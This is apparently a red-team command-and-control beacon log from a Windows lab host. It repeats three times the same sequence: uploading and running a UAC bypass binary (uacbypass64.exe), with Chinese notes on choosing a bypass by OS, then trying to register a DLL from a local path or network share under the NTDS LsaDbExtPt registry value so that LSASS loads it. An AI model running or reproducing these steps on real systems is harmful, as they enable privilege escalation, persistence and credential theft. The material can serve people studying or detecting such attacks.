01/22 14:24:25 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a; pid: 2224; os: Windows; version: 6.1; beacon arch: x86 (x64)
01/22 15:58:38 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a; pid: 2224; os: Windows; version: 6.1; beacon arch: x86 (x64)
01/22 16:11:27 [task] 4*************LSA Disver************
01/22 16:11:27 [task] 根据操作系统类型，选择不同的方式绕过uac， 会弹出高权限的计算器calc.exe
01/22 16:11:28 [task] Tasked beacon to make directory c:\RedTeam\
01/22 16:11:28 [task] cd c:\RedTeam\
01/22 16:11:28 [task] Tasked beacon to upload C:\Users\a\Desktop\ReadTeam\resource\uacbypass64.exe as uacbypass64.exe
01/22 16:11:28 [indicator] file: 743e0bf60cefe43ed7c3af5c0ffd98b9 160256 bytes uacbypass64.exe
01/22 16:11:28 [task] Tasked beacon to execute: c:\RedTeam\uacbypass64.exe 1 notepad.exe
01/22 16:11:28 [task] 执行代码
01/22 16:11:29 [checkin] host called home, sent: 160614 bytes
01/22 16:11:29 [error] could not spawn New-ItemProperty-PathHKLM:\SYSTEM\CurrentControlSet\Services\NTDS -NameLsaDbExtPt -Value"c:\temp\lsass_lib.dll"New-ItemProperty-PathHKLM:\SYSTEM\CurrentControlSet\Services\NTDS -NameLsaDbExtPt -Value"\\share\lulz\lsass_lib.dll": 2
01/22 16:30:58 [task] 4*************LSA Disver************
01/22 16:30:58 [task] 根据操作系统类型，选择不同的方式绕过uac， 会弹出高权限的计算器calc.exe
01/22 16:30:58 [task] Tasked beacon to make directory c:\RedTeam\
01/22 16:30:58 [task] cd c:\RedTeam\
01/22 16:30:59 [task] Tasked beacon to upload C:\Users\a\Desktop\ReadTeam\resource\uacbypass64.exe as uacbypass64.exe
01/22 16:30:59 [indicator] file: 743e0bf60cefe43ed7c3af5c0ffd98b9 160256 bytes uacbypass64.exe
01/22 16:30:59 [task] Tasked beacon to execute: c:\RedTeam\uacbypass64.exe 1 notepad.exe
01/22 16:30:59 [task] 执行代码
01/22 16:31:34 [checkin] host called home, sent: 160532 bytes
01/22 16:31:34 [error] could not spawn New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "c:\temp\lsass_lib.dll", "\\share\lulz\lsass_lib.dll": 2
01/22 17:14:12 [task] 4*************LSA Disver************
01/22 17:14:12 [task] 根据操作系统类型，选择不同的方式绕过uac， 会弹出高权限的计算器calc.exe
01/22 17:14:12 [task] Tasked beacon to make directory c:\RedTeam\
01/22 17:14:13 [task] cd c:\RedTeam\
01/22 17:14:13 [task] Tasked beacon to upload C:\Users\a\Desktop\ReadTeam\resource\uacbypass64.exe as uacbypass64.exe
01/22 17:14:13 [indicator] file: 743e0bf60cefe43ed7c3af5c0ffd98b9 160256 bytes uacbypass64.exe
01/22 17:14:13 [task] Tasked beacon to execute: c:\RedTeam\uacbypass64.exe 1 notepad.exe
01/22 17:14:13 [task] 执行代码
01/22 17:14:57 [checkin] host called home, sent: 160532 bytes
01/22 17:14:57 [error] could not spawn New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "c:\temp\lsass_lib.dll", "\\share\lulz\lsass_lib.dll": 2
